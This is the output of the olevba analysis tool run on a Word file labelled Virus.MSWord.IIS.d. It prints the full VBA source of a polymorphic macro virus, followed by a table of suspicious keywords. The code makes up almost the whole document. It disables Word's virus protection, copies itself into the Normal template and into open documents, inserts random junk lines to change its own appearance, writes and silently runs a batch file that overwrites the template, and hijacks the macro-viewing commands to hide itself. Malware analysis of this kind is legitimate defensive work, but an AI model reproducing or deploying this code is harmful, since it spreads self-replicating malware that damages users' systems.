olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.IIS.d-1b5f51b72bed71ddd85db48729d676608e9b2332
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.IIS.d-1b5f51b72bed71ddd85db48729d676608e9b2332 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Modul1.bas 
in file: Virus.MSWord.IIS.d-1b5f51b72bed71ddd85db48729d676608e9b2332 - OLE stream: 'Macros/VBA/Modul1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
Application.ShowVisualBasicEditor _
= False
a _
= Dir(NormalTemplate.FullName)
If a = "" Then GoTo NoSet
SetAttr _
NormalTemplate.FullName, _
vbNormal
NoSet:
begin:
On _
Error GoTo eb
NormAt _
= False
VBE.CommandBars("Edit").Controls(1).Enabled = False
Application.EnableCancelKey _
= wdCancelDisabled
WordBasic.DisableAutoMacros _
0
Options.VirusProtection _
= False
Options.ConfirmConversions _
= False
Application.ScreenUpdating _
= False
Options.SaveNormalPrompt _
= False
Close _
#1
Open "c:\msdos.sys" For Input As #1
Do _
Until EOF(1)
Line _
Input #1, a
If Left(UCase(a), 7) = "WINDIR=" Then
l _
= Len(a)
windir _
= Mid(a, 8, l)
End _
If
Loop
If windir = "" Then Exit Sub
On _
Error GoTo NoInf
ms _
= NormalTemplate.VBProject.VBComponents.Count
For _
t2 = 1 To ms
ls _
= NormalTemplate.VBProject.VBComponents(t2).CodeModule.countoflines
If _
ls > 3 Then l = NormalTemplate.VBProject.VBComponents(t2).CodeModule.Lines(1, 1)
If UCase(l) = "SUB AUTOCLOSE()" Then
NormT _
= 1
Exit _
For
End _
If
Next _
t2
ms _
= ActiveDocument.VBProject.VBComponents.Count
For _
tg = 1 To ms
ls _
= ActiveDocument.VBProject.VBComponents(tg).CodeModule.countoflines
If _
ls > 3 Then l = ActiveDocument.VBProject.VBComponents(tg).CodeModule.Lines(1, 1)
If UCase(l) = "SUB AUTOOPEN()" Then
Acd _
= 1
Exit _
For
End _
If
Next _
tg
If _
Acd = 1 And NormT = 1 Then Exit Sub
If _
Acd = 1 Then
FullCodeN = "Sub AutoClose()" & Chr(13)
t _
= 0
Randomize _
Timer
t _
= CInt(Rnd * 100)
If _
t < 50 Then g = 1
If _
t > 49 And t < 101 Then g = 2
If _
g = 1 Then
v _
= CInt(Rnd * 50)
For _
vs = 1 To v
beginNn:
z _
= CInt(Rnd * 250)
If _
z = 13 Then GoTo beginNn
If _
z < 65 Then GoTo beginNn
If _
z < 130 Then GoTo beginNn
va _
= va & Chr(z)
Next _
vs
v _
= CInt(Rnd * 20)
For _
vss = 1 To v
begin5:
z _
= CInt(Rnd * 250)
If _
z = 13 Then GoTo begin5
If _
z = 34 Then GoTo begin5
If _
z < 130 Then GoTo begin5
Inn _
= Inn & Chr(z)
Next _
vss
FullCodeN = FullCodeN & va & "=" & Chr(34) & Inn & Chr(34) & Chr(13)
End _
If
If _
g = 2 Then
v _
= CInt(Rnd * 50)
For _
vsss = 1 To v
begin2:
z _
= CInt(Rnd * 250)
If _
z = 13 Then GoTo begin2
If _
z < 130 Then GoTo begin2
va _
= va & Chr(z)
Next _
vsss
z _
= CInt(Rnd * 250)
Inn = "Chr(" & z & ")"
FullCodeN = FullCodeN & va & "=" & Inn & Chr(13)
End _
If
If _
g = 3 Then
v _
= CInt(Rnd * 50)
va = "'"
For _
vssss = 1 To v
begin3:
z _
= CInt(Rnd * 250)
If _
z = 13 Then GoTo begin3
If _
z < 130 Then GoTo begin3
va _
= va & Chr(z)
Next _
vssss
FullCodeN _
= FullCodeN & va & Chr(13)
End _
If
If _
g = 4 Then
v _
= CInt(Rnd * 50)
For _
vsssss = 1 To v
begin4:
z _
= CInt(Rnd * 250)
If _
z = 13 Then GoTo begin4
If _
z < 130 Then GoTo begin4
va _
= va & Chr(z)
Next _
vsssss
va = va & ":"
FullCodeN _
= FullCodeN & va & Chr(13)
End _
If
aaaa _
= ActiveDocument.VBProject.VBComponents.Item(tg).CodeModule.countoflines
hh _
= 1
Do
If _
hh = aaaa Then GoTo nextterm
hh _
= hh + 1
a _
= ActiveDocument.VBProject.VBComponents.Item(tg).CodeModule.Lines(hh, 1)
If Right(a, 1) = ":" Then
FullCodeN _
= FullCodeN & a & Chr(13)
GoTo _
NextLineN
End _
If
Spac _
= 0
t _
= 0
PosL _
= 0
BeginN:
l _
= Len(a)
Do
If _
PosL > l Then GoTo NoCN
PosL _
= PosL + 1
If _
Mid(a, PosL, 1) = Chr(34) Then
FullCodeN _
= FullCodeN & a & Chr(13)
GoTo _
NextLineN
End _
If
Loop
NoCN:
PosL _
= 0
If Right(a, 1) = "_" Then GoTo UnsplitN
GoTo _
SplitN
UnsplitN:
v _
= 0
y _
= a
Do
If Right(y, 1) <> "_" Then GoTo NoChN
l _
= Len(y)
PosL _
= 0
Do
PosL _
= PosL + 1
s _
= Mid(y, PosL, 1)
If s = "_" Then GoTo FoundN
Loop
FoundN:
Spac _
= PosL - 1
y _
= Left(y, l - 1)
hh _
= hh + 1
a _
= ActiveDocument.VBProject.VBComponents.Item(tg).CodeModule.Lines(hh, 1)
v _
= 1
y _
= y & a
Loop
NoChN:
a _
= y
c _
= 0
PoslO _
= 0
PosL _
= 0
GoTo _
BeginN
SplitN:
PosL _
= 0
l _
= Len(a)
k _
= 0
If _
Spac <> 0 Then
Do
k _
= k + 1
If _
k > l Then GoTo NC
s _
= Mid(a, k, 1)
If s = " " Then g = k
Loop
NC:
If _
g <= Spac Then
FullCodeN _
= FullCodeN & a & Chr(13)
GoTo _
NextLineN
End _
If
End _
If
Do
If _
PosL > l Then
FullCodeN _
= FullCodeN & a & Chr(13)
GoTo _
NextLineN
End _
If
PosL _
= PosL + 1
s _
= Mid(a, PosL, 1)
If _
s = Chr(34) Then
FullCodeN _
= FullCodeN & a & Chr(13)
GoTo _
NextLineN
End _
If
If s = " " Then
If _
Spac = 0 Then
f = Left(a, PosL) & " " & "_"
las _
= Mid(a, PosL + 1, l)
FullCodeN _
= FullCodeN & f & Chr(13)
FullCodeN _
= FullCodeN & las & Chr(13)
GoTo _
NextLineN
End _
If
If _
PosL <= Spac Then
wa _
= PosL - PoslO
If _
PoslO <> 0 Then
Temp = Mid(a, PoslO, wa) & " " & "_"
Else
Temp = Mid(a, 1, PosL) & " " & "_"
End _
If
FullCodeN _
= _
FullCodeN _
& Temp & Chr(13)
PoslO _
= _
PosL _
+ 1
c _
= 1
GoTo _
NextCharN
Else
c _
= 1
wa _
= PosL - (PoslO)
Temp = Mid(a, PoslO, wa) & " " & "_"
Temp2 _
= Mid(a, PosL + 1, l)
FullCodeN _
= FullCodeN & Temp & Chr(13) & Temp2 & Chr(13)
If _
PosL > Spac Then GoTo NextLineN
GoTo _
NextCharN
End _
If
Temp = Mid(a, PoslO + 1, PosL) & " " & "_"
FullCodeN _
= FullCodeN & Temp & Chr(13)
GoTo _
NextLineN
End _
If
NextCharN:
Loop
FullCodeN _
= FullCodeN & y & Chr(13)
GoTo _
NextLineN
NextLineN:
Loop
nextterm:
End _
If
If _
NormT = 1 Then
FullCodeD = "Sub AutoOpen()" & Chr(13)
t _
= 0
Randomize _
Timer
t _
= CInt(Rnd * 100)
If _
t < 50 Then g = 1
If _
t > 49 And t < 101 Then g = 2
If _
g = 1 Then
v _
= CInt(Rnd * 50)
For _
vDs = 1 To v
beginDD:
z _
= CInt(Rnd * 250)
If _
z = 13 Then GoTo beginDD
If _
z < 65 Then GoTo beginDD
If _
z < 130 Then GoTo beginDD
va _
= va & Chr(z)
Next _
vDs
v _
= CInt(Rnd * 20)
For _
vDss = 1 To v
beginD5:
z _
= CInt(Rnd * 250)
If _
z = 13 Then GoTo beginD5
If _
z = 34 Then GoTo beginD5
If _
z < 130 Then GoTo beginD5
Inn _
= Inn & Chr(z)
Next _
vDss
FullCodeD = FullCodeD & va & "=" & Chr(34) & Inn & Chr(34) & Chr(13)
End _
If
If _
g = 2 Then
v _
= CInt(Rnd * 50)
For _
vDsss = 1 To v
beginD2:
z _
= CInt(Rnd * 250)
If _
z = 13 Then GoTo beginD2
If _
z < 130 Then GoTo beginD2
va _
= va & Chr(z)
Next _
vDsss
z _
= CInt(Rnd * 250)
Inn = "Chr(" & z & ")"
FullCodeD = FullCodeD & va & "=" & Inn & Chr(13)
End _
If
If _
g = 3 Then
v _
= CInt(Rnd * 50)
va = "'"
For _
vdssss = 1 To v
beginD3:
z _
= CInt(Rnd * 250)
If _
z = 13 Then GoTo beginD3
If _
z < 130 Then GoTo beginD3
va _
= va & Chr(z)
Next _
vdssss
FullCodeD _
= FullCodeD & va & Chr(13)
End _
If
If _
g = 4 Then
v _
= CInt(Rnd * 50)
For _
vdsssss = 1 To v
beginD4:
z _
= CInt(Rnd * 250)
If _
z = 13 Then GoTo beginD4
If _
z < 130 Then GoTo beginD4
va _
= va & Chr(z)
Next _
vdsssss
va = va & ":"
FullCodeD _
= FullCodeD & va & Chr(13)
End _
If
aaaa _
= NormalTemplate.VBProject.VBComponents.Item(t2).CodeModule.countoflines
hh _
= 1
Do
If _
hh = aaaa Then GoTo EndTerm
hh _
= hh + 1
a _
= NormalTemplate.VBProject.VBComponents.Item(t2).CodeModule.Lines(hh, 1)
If Right(a, 1) = ":" Then
FullCodeD _
= FullCodeD & a & Chr(13)
GoTo _
NextLineD
End _
If
Spac _
= 0
t _
= 0
PosL _
= 0
beginD:
l _
= Len(a)
Do
If _
PosL > l Then GoTo NoCD
PosL _
= PosL + 1
If _
Mid(a, PosL, 1) = Chr(34) Then
FullCodeD _
= FullCodeD & a & Chr(13)
GoTo _
NextLineD
End _
If
Loop
NoCD:
PosL _
= 0
If Right(a, 1) = "_" Then GoTo UnsplitD
GoTo _
SplitD
UnsplitD:
v _
= 0
y _
= a
Do
If Right(y, 1) <> "_" Then GoTo NoChD
l _
= Len(y)
PosL _
= 0
Do
PosL _
= PosL + 1
s _
= Mid(y, PosL, 1)
If s = "_" Then GoTo FoundD
Loop
FoundD:
Spac _
= PosL - 1
y _
= Left(y, l - 1)
hh _
= hh + 1
a _
= NormalTemplate.VBProject.VBComponents.Item(t2).CodeModule.Lines(hh, 1)
v _
= 1
y _
= y & a
Loop
NoChD:
a _
= y
c _
= 0
PoslO _
= 0
PosL _
= 0
GoTo _
beginD
SplitD:
PosL _
= 0
l _
= Len(a)
k _
= 0
If _
Spac <> 0 Then
Do
k _
= k + 1
If _
k > l Then GoTo DC
s _
= Mid(a, k, 1)
If s = " " Then g = k
Loop
DC:
If _
g <= Spac Then
FullCodeD _
= FullCodeD & a & Chr(13)
GoTo _
NextLineD
End _
If
End _
If
Do
If _
PosL > l Then
FullCodeD _
= FullCodeD & a & Chr(13)
GoTo _
NextLineD
End _
If
PosL _
= PosL + 1
s _
= Mid(a, PosL, 1)
If _
s = Chr(34) Then
FullCodeD _
= FullCodeD & a & Chr(13)
GoTo _
NextLineD
End _
If
If s = " " Then
If _
Spac = 0 Then
f = Left(a, PosL) & " " & "_"
las _
= Mid(a, PosL + 1, l)
FullCodeD _
= FullCodeD & f & Chr(13)
FullCodeD _
= FullCodeD & las & Chr(13)
GoTo _
NextLineD
End _
If
If _
PosL <= Spac Then
wa _
= PosL - PoslO
If _
PoslO <> 0 Then
Temp = Mid(a, PoslO, wa) & " " & "_"
Else
Temp = Mid(a, 1, PosL) & " " & "_"
End _
If
FullCodeD _
= _
FullCodeD _
& Temp & Chr(13)
PoslO _
= _
PosL _
+ 1
c _
= 1
GoTo _
NextCharD
Else
c _
= 1
wa _
= PosL - (PoslO)
Temp = Mid(a, PoslO, wa) & " " & "_"
Temp2 _
= Mid(a, PosL + 1, l)
FullCodeD _
= FullCodeD & Temp & Chr(13) & Temp2 & Chr(13)
If _
PosL > Spac Then GoTo NextLineD
GoTo _
NextCharD
End _
If
Temp = Mid(a, PoslO + 1, PosL) & " " & "_"
FullCodeD _
= FullCodeD & Temp & Chr(13)
GoTo _
NextLineD
End _
If
NextCharD:
Loop
FullCodeD _
= FullCodeD & y & Chr(13)
GoTo _
NextLineD
NextLineD:
Loop
EndTerm:
End _
If
If _
NormT <> 1 Then
look:
ms _
= NormalTemplate.VBProject.VBComponents.Count
For _
Inn = 2 To ms
a _
= NormalTemplate.VBProject.VBComponents(Inn).CodeModule.countoflines
If _
a < 1 Then
NormalTemplate.VBProject.VBComponents(Inn).CodeModule.AddFromstring _
(FullCodeN)
i _
= 20
Exit _
For
End _
If
Next _
Inn
If _
i <> 20 Then
Close _
#1
a = Dir(windir & "\System\Flitnic.drv")
If a <> "" Then Kill windir & "\system\Flitnic.drv"
Close _
#1
Open windir & "\System\Flitnic.drv" For Append As #1
Print #1, "Attribute VB_Name = " & Chr(34) & "Modul1" & Chr(34)
Close _
#1
NormalTemplate.VBProject.VBComponents.Import windir & "\System\Flitnic.drv"
GoTo _
look
End _
If
a = Dir(windir & "\System\lo.sys")
If a <> "" Then Kill windir & "\System\lo.sys"
NormalTemplate.OpenAsDocument
NormAtt _
= ActiveDocument.ReadOnly
l = ""
On _
Error GoTo eb
ActiveDocument.SaveAs FileName:=windir & "\System\lo.sys", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
NormalTemplate.Saved _
= True
ActiveDocument.Saved _
= True
ActiveDocument.Close
Close _
#1
a = Dir(windir & "\System\lo.bat")
If a <> "" Then Kill windir & "\System\lo.bat"
Close
Open windir & "\System\lo.bat" For Append As #1
Print #1, ":Begin"
l _
= Len(NormalTemplate.FullName)
l _
= l - 10
For _
i = 1 To 500
Print #1, "rem Flitnic has catched you... he, he"
Next _
i
Print #1, ":Begin"
Print #1, "Move /y c:\Troop.dat " & NormalTemplate.FullName
Print #1, "If exist c:\Troop.dat goto Begin"
Close _
#1
NormalTemplate.Saved _
= True
a _
= Dir(NormalTemplate.FullName)
If a = "" Then GoTo notemp
If _
NormAt = True Then
End _
If
notemp:
End _
If
i _
= 1
If _
Acd <> 1 Then
Close
look2:
ms _
= ActiveDocument.VBProject.VBComponents.Count
For _
inn2 = 2 To ms
a _
= ActiveDocument.VBProject.VBComponents(inn2).CodeModule.countoflines
If _
a < 1 Then
ActiveDocument.VBProject.VBComponents(inn2).CodeModule.AddFromstring _
(FullCodeD)
i _
= 20
Exit _
For
End _
If
Next _
inn2
If _
i <> 20 Then
Close _
#1
a = Dir(windir & "\System\Flitnic.drv")
If a <> "" Then Kill windir & "\system\Flitnic.drv"
Close _
#1
Open windir & "\System\Flitnic.drv" For Append As #1
Print #1, "Attribute VB_Name = " & Chr(34) & "Modul1" & Chr(34)
Close _
#1
ActiveDocument.VBProject.VBComponents.Import windir & "\System\Flitnic.drv"
GoTo _
look2
End _
If
If UCase(Left(ActiveDocument.FullName, 1)) <> "A" And Mid(ActiveDocument.FullName, 3, 1) = "\" Then
If _
ActiveDocument.ReadOnly = True Then GoTo noactsave
ActiveDocument.Save
noactsave:
Else
ActiveDocument.Saved _
= True
End _
If
End _
If
NoInf:
eb:
a _
= Dir(NormalTemplate.FullName)
If a = "" Then
NormalTemplate.Saved _
= False
GoTo _
NoNormal
End _
If
If _
NormAtt = True Then
FileCopy windir & "\System\lo.sys", "c:\Troop.dat"
SetAttr _
(NormalTemplate.FullName), vbNormal
a = Shell(windir & "\System\lo.bat", 0)
Else
NormalTemplate.Save
End _
If
NormalTemplate.Saved _
= True
NoNormal:
End _
Sub
Sub _
ViewVbCode()
On _
Error GoTo NoDoc
a _
= Dir(NormalTemplate.FullName)
If a = "" Then GoTo NoSet
SetAttr _
(NormalTemplate.FullName), vbNormal
NoSet:
Close _
#1
Open "c:\msdos.sys" For Input As #1
Do _
Until EOF(1)
Line _
Input #1, a
If Left(UCase(a), 7) = "WINDIR=" Then
l _
= Len(a)
windir _
= Mid(a, 8, l)
End _
If
Loop
Close _
#1
If windir = "" Then Exit Sub
ms _
= ActiveDocument.VBProject.VBComponents.Count
For _
t = 1 To ms
ls _
= ActiveDocument.VBProject.VBComponents(t).CodeModule.countoflines
If _
ls > 3 Then l = ActiveDocument.VBProject.VBComponents(t).CodeModule.Lines(1, 1)
If UCase(l) = "SUB AUTOOPEN()" Then
Acd _
= 1
Exit _
For
End _
If
Next _
t
a _
= ActiveDocument.VBProject.VBComponents.Item(t).CodeModule.countoflines
ActiveDocument.VBProject.VBComponents(t).CodeModule.deletelines _
1, a
ActiveDocument.Saved _
= True
NoDoc:
ms _
= NormalTemplate.VBProject.VBComponents.Count
For _
t2 = 2 To ms
ls _
= NormalTemplate.VBProject.VBComponents(t2).CodeModule.countoflines
If _
ls > 3 Then l = NormalTemplate.VBProject.VBComponents(t2).CodeModule.Lines(1, 1)
If UCase(l) = "SUB AUTOCLOSE()" Then
NormT _
= 1
Exit _
For
End _
If
Next _
t2
FileCopy windir & "\System\lo.sys", "c:\Troop.dat"
a = Shell(windir & "\System\lo.bat", 0)
For _
i = 1 To 2
al _
= NormalTemplate.VBProject.VBComponents(t2).CodeModule.countoflines
NormalTemplate.VBProject.VBComponents(t2).CodeModule.deletelines _
1, al
Next _
i
esub:
eb:
Application.ShowVisualBasicEditor _
= True
NoDocL:
Options.SaveNormalPrompt _
= False
NormalTemplate.Saved _
= True
End _
Sub
Sub _
ToolsMacro()
On _
Error GoTo NoDoc
a _
= Dir(NormalTemplate.FullName)
If a = "" Then GoTo NoSet
SetAttr _
(NormalTemplate.FullName), vbNormal
NoSet:
ms _
= ActiveDocument.VBProject.VBComponents.Count
For _
t = 1 To ms
ls _
= ActiveDocument.VBProject.VBComponents(t).CodeModule.countoflines
If _
ls > 3 Then l = ActiveDocument.VBProject.VBComponents(t).CodeModule.Lines(1, 1)
If UCase(l) = "SUB AUTOOPEN()" Then
Acd _
= 1
Exit _
For
End _
If
Next _
t
If _
Acd = 1 Then
FullCodeD = "Sub AutoOpen" & Chr(13)
FullCodeN = "Sub AutoClose()" & Chr(13)
a _
= ActiveDocument.VBProject.VBComponents.Item(t).CodeModule.countoflines
For _
ii = 2 To a
l _
= ActiveDocument.VBProject.VBComponents.Item(t).CodeModule.Lines(ii, 1)
FullCodeN _
= FullCodeN & l & Chr(13)
FullCodeD _
= FullCodeD & l & Chr(13)
Next _
ii
End _
If
a _
= ActiveDocument.VBProject.VBComponents(t).CodeModule.countoflines
ActiveDocument.VBProject.VBComponents(t).CodeModule.deletelines _
1, a
ActiveDocument.Saved _
= True
ActiveDocument.Saved _
= True
NoDoc:
ms _
= NormalTemplate.VBProject.VBComponents.Count
For _
t2 = 1 To ms
ls _
= NormalTemplate.VBProject.VBComponents(t2).CodeModule.countoflines
If _
ls > 3 Then l = NormalTemplate.VBProject.VBComponents(t2).CodeModule.Lines(1, 1)
If UCase(l) = "SUB AUTOCLOSE()" Then
NormT _
= 1
Exit _
For
End _
If
Next _
t2
If _
NormT = 1 Then
FullCodeD = "Sub AutoOpen()" & Chr(13)
FullCodeN = "Sub AutoClose()" & Chr(13)
a _
= NormalTemplate.VBProject.VBComponents.Item(t2).CodeModule.countoflines
For _
iiii = 2 To a
l _
= NormalTemplate.VBProject.VBComponents.Item(t2).CodeModule.Lines(iiii, 1)
FullCodeD _
= FullCodeD & l & Chr(13)
FullCodeN _
= FullCodeN & l & Chr(13)
Next _
iiii
End _
If
l = ""
On _
Error GoTo 0
On _
Error GoTo eb
a _
= NormalTemplate.VBProject.VBComponents(t2).CodeModule.countoflines
NormalTemplate.VBProject.VBComponents(t2).CodeModule.deletelines _
1, a
NormalTemplate.Saved _
= True
esub:
Close _
#1
Open "c:\msdos.sys" For Input As #1
Do _
Until EOF(1)
Line _
Input #1, a
If Left(UCase(a), 7) = "WINDIR=" Then
l _
= Len(a)
windir _
= Mid(a, 8, l)
End _
If
Loop
Close _
#1
If windir = "" Then Exit Sub
a _
= GetAttr(NormalTemplate.FullName)
If _
a = 33 Then a = 1
If _
a = 1 Then GoTo eb
eb:
NormalTemplate.Saved _
= True
Application.Dialogs(wdDialogToolsMacro).Show
ReInf _
= True
If _
Application.ShowVisualBasicEditor = True Then ReInf = False
If _
ReInf = True Then
Acd _
= 0
NormT _
= 0
If _
NormT <> 1 Then
NormalTemplate.OpenAsDocument
NormAt _
= ActiveDocument.ReadOnly
ActiveDocument.Close
Close _
#1
look:
ms _
= NormalTemplate.VBProject.VBComponents.Count
For _
Inn = 2 To ms
a _
= NormalTemplate.VBProject.VBComponents(Inn).CodeModule.countoflines
If _
a < 1 Then
NormalTemplate.VBProject.VBComponents(Inn).CodeModule.AddFromstring _
(FullCodeN)
i _
= 20
Exit _
For
End _
If
Next _
Inn
If _
i <> 20 Then
Close _
#1
a = Dir(windir & "\System\Flitnic.drv")
If a <> "" Then Kill windir & "\system\Flitnic.drv"
Close _
#1
Open windir & "\System\Flitnic.drv" For Append As #1
Print #1, "Attribute VB_Name = " & Chr(34) & "Modul1" & Chr(34)
Close _
#1
NormalTemplate.VBProject.VBComponents.Import windir & "\System\Flitnic.drv"
GoTo _
look
End _
If
a _
= Dir(NormalTemplate.FullName)
If a = "" Then GoTo notemp
If _
NormAt = True Then
NormalTemplate.Saved _
= True
End _
If
End _
If
i _
= 1
If _
NormAt <> True Then NormalTemplate.Save
notemp:
If _
Acd <> 1 Then
Close
look2:
a _
= Application.Documents.Count
If _
a < 1 Then GoTo NoDocL
ms _
= ActiveDocument.VBProject.VBComponents.Count
For _
inn2 = 2 To ms
a _
= ActiveDocument.VBProject.VBComponents(inn2).CodeModule.countoflines
If _
a < 1 Then
ActiveDocument.VBProject.VBComponents(inn2).CodeModule.AddFromstring _
(FullCodeD)
i _
= 20
Exit _
For
End _
If
Next _
inn2
If _
i <> 20 Then
Close _
#1
a = Dir(windir & "\System\Flitnic.drv")
If a <> "" Then Kill windir & "\system\Flitnic.drv"
Close _
#1
Open windir & "\System\Flitnic.drv" For Append As #1
Print #1, "Attribute VB_Name = " & Chr(34) & "Modul1" & Chr(34)
Close _
#1
ActiveDocument.VBProject.VBComponents.Import windir & "\System\Flitnic.drv"
GoTo _
look2
End _
If
If UCase(Left(ActiveDocument.FullName, 1)) <> "A" And Mid(ActiveDocument.FullName, 3, 1) = "\" Then
If _
ActiveDocument.ReadOnly = True Then GoTo noactsave
ActiveDocument.Save
noactsave:
Else
ActiveDocument.Saved _
= True
End _
If
End _
If
NoDocL:
Else
FileCopy windir & "\System\lo.sys", "c:\Troop.dat"
a = Shell(windir & "\System\lo.bat", 0)
For _
i = 1 To 2
al _
= NormalTemplate.VBProject.VBComponents(t2).CodeModule.countoflines
NormalTemplate.VBProject.VBComponents(t2).CodeModule.deletelines _
1, al
NormalTemplate.Saved _
= True
Next _
i
End _
If
Options.SaveNormalPrompt _
= False
NormalTemplate.Saved _
= True
End _
Sub





+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AUTOCLOSE           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|FileCopy            |May copy a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |lo.bat              |Executable file name                         |
+----------+--------------------+---------------------------------------------+

